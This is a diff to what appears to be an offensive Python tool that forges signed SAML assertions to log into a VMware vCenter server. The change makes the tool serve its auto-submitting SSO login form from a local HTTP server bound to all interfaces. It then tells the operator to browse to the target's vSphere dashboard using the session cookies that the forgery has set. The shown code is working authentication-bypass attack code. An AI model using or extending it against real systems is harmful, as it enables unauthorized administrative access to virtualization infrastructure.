@@ -2037,9 +2037,11 @@ def main():
                                                      key_pem, cert1_pem, cert2_pem, authn_id)
 
         if choice == '1':
-            import tempfile
+            import socket, threading
+            from http.server import HTTPServer, BaseHTTPRequestHandler
+
             saml_b64 = base64.b64encode(signed).decode()
-            html = (
+            html_bytes = (
                 '<!DOCTYPE html><html>\n'
                 f'<body onload="document.forms[0].submit()">\n'
                 f'<form method="POST" action="https://{target}/ui/saml/websso/sso">\n'
@@ -2048,14 +2050,38 @@ def main():
                 '</form>\n'
                 '<p>Submitting SSO login...</p>\n'
                 '</body></html>'
-            )
-            out = Path(tempfile.gettempdir()) / 'vcenter_saml_login.html'
-            out.write_text(html)
-            print(f'\n[+] Open in browser (act fast — SSO request expires in ~2 min):')
-            print(f'    file://{out}')
+            ).encode()
+
+            class _Handler(BaseHTTPRequestHandler):
+                def do_GET(self):
+                    self.send_response(200)
+                    self.send_header('Content-Type', 'text/html')
+                    self.send_header('Content-Length', str(len(html_bytes)))
+                    self.end_headers()
+                    self.wfile.write(html_bytes)
+                def log_message(self, *_):
+                    pass
+
+            srv = HTTPServer(('0.0.0.0', 0), _Handler)
+            port = srv.server_address[1]
+
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as _s:
+                    _s.connect((target, 80))
+                    local_ip = _s.getsockname()[0]
+            except Exception:
+                local_ip = '0.0.0.0'
+
+            print(f'\n[+] SAML login page ready — open in any browser on this network:')
+            print(f'    http://{local_ip}:{port}/')
             print(f'\n    When the page goes blank, navigate to:')
             print(f'    https://{target}/ui/')
             print(f'    (cookies are already set — you will land on the vSphere dashboard)')
+            print(f'\n    Ctrl-C to stop the server.')
+            try:
+                srv.serve_forever()
+            except KeyboardInterrupt:
+                pass
             return
 
         cname, cval, ui_session = saml_login(target, signed, relay_state)
